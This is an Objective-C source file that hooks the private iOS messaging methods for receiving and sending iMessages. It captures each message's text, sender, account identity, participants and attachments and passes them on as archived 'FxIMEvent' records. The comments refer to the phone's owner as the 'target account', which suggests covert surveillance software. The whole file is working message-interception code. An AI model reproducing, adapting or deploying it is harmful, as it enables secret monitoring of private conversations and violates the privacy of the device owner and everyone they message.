//
//  IMessage.h
//  MSFSP
//
//  Created by Makara Khloth on 2/1/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "MSFSP.h"
#import "MSFSPUtils.h"
#import "IMChat.h"
#import "IMMessage.h"
#import "IMHandle.h"
#import "IMAccount.h"
#import "DaemonPrivateHome.h"
#import "DateTimeFormat.h"
#import "FxIMEvent.h"
#import "FxRecipient.h"
#import "FxAttachment.h"
#import "IMessageUtils.h"
#import "DefStd.h"
#import "StringUtils.h"
#import "NSConcreteAttributedString.h"
#import "IMFileTransferCenter.h"
#import "IMFileTransfer.h"


// Incoming iMessage
HOOK(IMChat, _handleIncomingMessage$, void, id arg1) { // TESTED 4s 5.1.1
    IMMessage *message = (IMMessage *)arg1;    
	
	DLog(@"IN message = %@", message);
	DLog(@"hasInlineAttachments: %d, isFromMe: %d, messageID: %d", [message hasInlineAttachments], [message isFromMe], [message messageID]);
	
	IMAccount *account = [self account];
	NSString *serviceName = [account serviceName]; // Service name for sms/mms is SMS
	
	DLog (@"serviceName of message = %@", serviceName);
	
	if(![message isFromMe] && ([message messageID] > 0) && // fromMe method is no longer exist in IOS 6
	   ([message messageID] > [[IMessageUtils shareIMessageUtils] mLastMessageID]) &&
	   ([serviceName isEqualToString:@"iMessage"] || [serviceName isEqualToString:@"Madrid"])) {
		
		DLog(@"lastMessageID: %d", [[IMessageUtils shareIMessageUtils] mLastMessageID]);
		[[IMessageUtils shareIMessageUtils] setMLastMessageID:[message messageID]];
		NSString *msg = [message summaryString];
		//DLog (@"================ >>>>>> text: %@", msg)
		
		//Convert msg to NSUTF8StringEncoding for emoji
		//NSData *temp = [msg dataUsingEncoding:NSNonLossyASCIIStringEncoding];
		//NSString *goodValue = [[NSString alloc] initWithData:temp encoding:NSUTF8StringEncoding];
		//DLog (@"============================================")
		//DLog (@"================ >>>>>> goodValue: %@", goodValue)
		//DLog (@"============================================")
		//[goodValue release];
		
		//---------------------- Partipcipants --------------------
		NSMutableArray *participants = [NSMutableArray array];
		
		IMHandle *sender = [message sender];
		
		DLog (@"================= sender ====================");
		DLog (@"account = %@", [sender account]);				// It will return target account
		DLog (@"uniqueID = %@", [[sender account] uniqueID]);
		DLog (@"displayName = %@", [[sender account] displayName]);
		
		DLog (@"ID = %@", [sender ID]);
		DLog (@"uniqueName = %@", [sender uniqueName]);
		DLog (@"name = %@", [sender name]);
		DLog (@"fullName = %@", [sender fullName]);
		DLog (@"nameAndID = %@", [sender nameAndID]);
		DLog (@"normalizedID = %@", [sender normalizedID]);
		DLog (@"displayID = %@", [sender displayID]);
		DLog (@"================= sender ====================");
		
		/*
		 NOTE:
		 UserID: is a sender of this message
		 Partipcipants: is all participants exclude sender (UserID) of this message
		 
		 - INCOMING:
		 1. Single chat: participant is only one which is the sender of this message
		 2. Group chat: participants are all exclude target account itself
		 
		 Thus either case we must include target account itself as participant
		 
		 NEW IM event structure require ***
		 - First recipient must be target in the case incoming IM
		 */
		
		DLog (@"================= account ====================");
		DLog (@"login = %@", [account login]);
		DLog (@"ID = %@", [[account loginIMHandle] ID]);
		DLog (@"loginDisplayID = %@", [[account loginIMHandle] displayID]);
		DLog (@"loginName = %@", [[account loginIMHandle] name]);
		DLog (@"myStatusMessage = %@", [account myStatusMessage]);
		DLog (@"myPictureData = %@", [account myPictureData]);
		DLog (@"uniqueID = %@", [account uniqueID]);
		DLog (@"displayName = %@", [account displayName]);
		DLog (@"name = %@", [account name]);
		DLog (@"internalName = %@", [account internalName]);
		DLog (@"shortName = %@", [account shortName]);
		DLog (@"================= account ====================");
		
		DLog (@"================= self ====================");
		DLog (@"roomName = %@", [self roomName]);
		DLog (@"guid = %@", [self guid]);
		DLog (@"================= self ====================");
		
		// This information must match to user id in outgoing method
		FxRecipient *participant = [[FxRecipient alloc] init];
		[participant setRecipNumAddr:[[account loginIMHandle] ID]]; // Number or email in iMessage of Settings application
		[participant setRecipContactName:[[account loginIMHandle] displayID]];
		[participants addObject:participant];
		[participant release];
		
		DLog (@"Participants of this chat = %@", [self participants]);
		
		for (IMHandle *participantIM in [self participants]) {
			DLog (@"================= participant IN ====================");
			DLog(@"name = %@", [participantIM name]);
			DLog(@"displayID = %@", [participantIM displayID]);
			DLog(@"ID = %@", [participantIM ID]);
			DLog (@"================= participant IN ====================");
			
			// Participant's displayID/name must not equal to sender's displayID/name
			if (![[sender displayID] isEqualToString:[participantIM displayID]] ||
				![[sender name] isEqualToString:[participantIM name]]) {
				FxRecipient *participant = [[FxRecipient alloc] init];
				[participant setRecipNumAddr:[participantIM displayID]]; // +668xxx (some time)
				[participant setRecipContactName:[participantIM name]]; // Contact name or 08xxx
				[participants addObject:participant];
				[participant release];
			}
		}
		
		////////////////////////////////////////////////////
		
		FxIMEvent *imEvent = [[FxIMEvent alloc] init];
		[imEvent setMIMServiceID:kIMServiceIDiMessage];
		[imEvent setMDirection:kEventDirectionIn];
		[imEvent setMMessage:msg];		
		[imEvent setMUserID:[sender ID]]; // Phone number or email address of sender
		[imEvent setMUserDisplayName:[sender displayID]]; // Name of sender in address book
		
		// Conversation id
		NSString * conversationId = nil;
		for(int i = 0; i < [[self participants]count]; i++){
			IMHandle * handle = [[self participants]objectAtIndex:i];
			if(i == 0){
				conversationId = [NSString stringWithFormat:@"%@",[handle ID]];
			}else{
				conversationId = [NSString stringWithFormat:@"%@,%@",conversationId,[handle ID]];
			}
		}
		DLog(@"conversationId %@",conversationId);
		
		// Chat identifier
		NSString * chatIdentifier = nil;
		for(int i = 0; i < [[self participants]count]; i++){
			IMHandle * handle = [[self participants]objectAtIndex:i];
			if(i == 0){
				chatIdentifier = [NSString stringWithFormat:@"%@",[handle name]];
			}else{
				chatIdentifier = [NSString stringWithFormat:@"%@,%@",chatIdentifier,[handle name]];
			}
		}
		// Handle name will return +668xxx for single chat (unlike outgoing which is 08xxx)
		DLog(@"ChatIdentifier %@",chatIdentifier);

		[imEvent setMParticipants:participants];
		[imEvent setMAttachments:[NSArray array]];
		[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		
		// New fields...
		[imEvent setMServiceID:kIMServiceiMessage];
		[imEvent setMConversationID:conversationId];
		[imEvent setMConversationName:chatIdentifier];
		
		//Capture Location , File Sharing ,Share Contact
		if([message hasInlineAttachments]) {
			[IMessageUtils captureAttachmentsAndSendFromMessage:message toEvent:imEvent];
			[NSThread sleepForTimeInterval:1.0];
		}else{
			NSMutableData* data = [[NSMutableData alloc] init];
			NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
			[archiver encodeObject:imEvent forKey:kiMessageArchived];
			[archiver finishEncoding];
			[IMessageUtils sendData:data];
			[archiver release];
		}
		[imEvent release];
	}
	CALL_ORIG(IMChat, _handleIncomingMessage$, arg1);
}


// Outgoing iMessage
HOOK(IMChat, sendMessage$, void, id arg1) {  // TESTED 4s 5.1.1
	IMMessage *message = (IMMessage *)arg1;
	
	DLog(@"OUT message = %@", message);
	DLog(@"hasInlineAttachments: %d, isFinished: %d", [message hasInlineAttachments], [message isFinished]);
	
	IMAccount *account = [self account];
	NSString *serviceName = [account serviceName]; // Service name for sms/mms is SMS
	DLog(@"account = %@", account);
	DLog (@"serviceName of message = %@", serviceName);
	
    if([message isFinished]) {
        if ([message isFromMe]  && ([serviceName isEqualToString:@"iMessage"] || [serviceName isEqualToString:@"Madrid"]) 
			&& (([[message summaryString]length] > 0 && ![message hasInlineAttachments]) || [message hasInlineAttachments]) && ![message error]) {
			
			NSString *msg =[message summaryString];
			DLog (@"================ >>>>>> text: %@", msg);
			
			//Convert msg to NSUTF8StringEncoding for emoji
			//NSData *temp = [msg dataUsingEncoding:NSNonLossyASCIIStringEncoding];
			//NSString *goodValue = [[NSString alloc] initWithData:temp encoding:NSUTF8StringEncoding];
			//DLog (@"================ >>>>>> goodValue: %@", goodValue);
			//[goodValue release];
			
			
			//---------------------- Partipcipants --------------------
			NSMutableArray *participants = [NSMutableArray array];
			
			/*
			 NOTE:
			 UserID: is a sender of this message
			 Partipcipants: is all participants exclude sender (UserID) of this message
			 
			 - OUTGOING:
			 1. Single chat: participant is only one which is the recipient of this message
			 2. Group chat: participants are all recipients of this message
			 */
			
			DLog (@"================= account ====================");
			DLog (@"login = %@", [account login]);
			DLog (@"loginDisplayID = %@", [[account loginIMHandle] displayID]);
			DLog (@"loginName = %@", [[account loginIMHandle] name]);
			DLog (@"myStatusMessage = %@", [account myStatusMessage]);
			DLog (@"myPictureData = %@", [account myPictureData]);
			DLog (@"uniqueID = %@", [account uniqueID]);
			DLog (@"displayName = %@", [account displayName]);
			DLog (@"name = %@", [account name]);
			DLog (@"internalName = %@", [account internalName]);
			DLog (@"shortName = %@", [account shortName]);
			DLog (@"================= account ====================");
			
			DLog (@"================= self ====================");
			DLog (@"roomName = %@", [self roomName]);
			DLog (@"guid = %@", [self guid]);
			DLog (@"================= self ====================");
			
			
			// Participants
			for (IMHandle *imHandle in [self participants]) {
				DLog (@"================= participant OUT ====================");
				DLog(@"name = %@", [imHandle name]);
				DLog(@"displayID = %@", [imHandle displayID]);
				DLog(@"ID = %@", [imHandle ID]);
				DLog (@"================= participant OUT ====================");
				
				FxRecipient *participant = [[FxRecipient alloc] init];
				[participant setRecipNumAddr:[imHandle displayID]]; // 08xxx
				[participant setRecipContactName:[imHandle name]]; // Contact name or 08xxx
				[participants addObject:participant];
				[participant release];
			}
			
			FxIMEvent *imEvent = [[FxIMEvent alloc] init];
			[imEvent setMIMServiceID:kIMServiceIDiMessage];
			[imEvent setMDirection:kEventDirectionOut];
			[imEvent setMMessage:msg];
			[imEvent setMUserID:[[account loginIMHandle] ID]]; // p:08xx or e:forum.this@gmail.com
			[imEvent setMUserDisplayName:[[account loginIMHandle] displayID]];
			
			DLog (@"***********[account login] = %@", [account login]);
			DLog (@"***********[[account loginIMHandle] ID] = %@", [[account loginIMHandle] ID]);
			DLog (@"***********[[account loginIMHandle] displayID] = %@", [[account loginIMHandle] displayID]);
			DLog (@"***********[[account loginIMHandle] name] = %@", [[account loginIMHandle] name]);
			DLog (@"***********[[account loginIMHandle] fullName] = %@", [[account loginIMHandle] fullName]);
			DLog (@"***********[[account loginIMHandle] nameAndID] = %@", [[account loginIMHandle] nameAndID]);
			
			[imEvent setMParticipants:participants];
			[imEvent setMAttachments:[NSArray array]];
			[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
			
			// Conversation id
			NSString * conversationId = nil;
			for(int i = 0; i < [[self participants]count]; i++){
				IMHandle * handle = [[self participants]objectAtIndex:i];
				if(i == 0){
					conversationId = [NSString stringWithFormat:@"%@",[handle ID]];
				}else{
					conversationId = [NSString stringWithFormat:@"%@,%@",conversationId,[handle ID]];
				}
			}
			DLog(@"conversationId %@",conversationId);
			
			// Chat identifier
			NSString * chatIdentifier = nil;
			for(int i = 0; i < [[self participants]count]; i++){
				IMHandle * handle = [[self participants]objectAtIndex:i];
				if(i == 0){
					chatIdentifier = [NSString stringWithFormat:@"%@",[handle name]];
				}else{
					chatIdentifier = [NSString stringWithFormat:@"%@,%@",chatIdentifier,[handle name]];
				}
			}
			DLog(@"ChatIdentifier %@",chatIdentifier);
			
			// New fields...
			[imEvent setMServiceID:kIMServiceiMessage];
			[imEvent setMConversationID:conversationId];
			[imEvent setMConversationName:chatIdentifier];
			[imEvent setMRepresentationOfMessage:kIMMessageText];
			
			//Capture Location , File Sharing ,Share Contact
			if([message hasInlineAttachments]) {
				[IMessageUtils captureAttachmentsAndSendFromMessage:message toEvent:imEvent];
				[NSThread sleepForTimeInterval:1.0];
			}else{
				NSMutableData* data = [[NSMutableData alloc] init];
				NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
				[archiver encodeObject:imEvent forKey:kiMessageArchived];
				[archiver finishEncoding];
				[IMessageUtils sendData:data];
				[archiver release];
			}
			[imEvent release];
		}
	}
	
	
	CALL_ORIG(IMChat, sendMessage$, arg1);
}

